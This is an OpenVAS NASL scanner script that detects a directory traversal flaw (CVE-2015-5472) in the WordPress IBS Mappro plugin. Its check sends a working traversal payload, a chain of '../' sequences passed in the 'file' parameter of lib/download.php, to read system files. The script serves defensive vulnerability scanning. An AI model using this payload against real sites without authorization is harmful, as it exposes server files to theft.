###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_ibs_mappro_dir_trav_vuln.nasl 12313 2018-11-12 08:53:51Z asteins $
#
# Wordpress IBS Mappro Directory Traversal Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.808201");
  script_version("$Revision: 12313 $");
  script_cve_id("CVE-2015-5472");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-11-12 09:53:51 +0100 (Mon, 12 Nov 2018) $");
  script_tag(name:"creation_date", value:"2016-05-20 16:09:30 +0530 (Fri, 20 May 2016)");
  script_tag(name:"qod_type", value:"exploit");
  script_name("Wordpress IBS Mappro Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  IBS Mappro plugin and is prone to directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not");

  script_tag(name:"insight", value:"The flaw exists due to an improper sanitization
  of input to 'file' parameter in 'lib/download.php' file.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to read arbitrary files.");

  script_tag(name:"affected", value:"Wordpress IBS Mappro version 0.6 and previous");

  script_tag(name:"solution", value:"Upgrade to IBS Mappro version 1.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/8091");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/ibs-mappro");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
   url = dir + '/wp-content/plugins/ibs-mappro/lib/download.php?file=' + crap(data: "../", length: 3*15) + files[file];

   if(http_vuln_check(port:http_port, url:url, check_header:TRUE, pattern:file))
   {
     report = report_vuln_url(port:http_port, url:url);
     security_message(port:http_port, data:report);
     exit(0);
   }
}
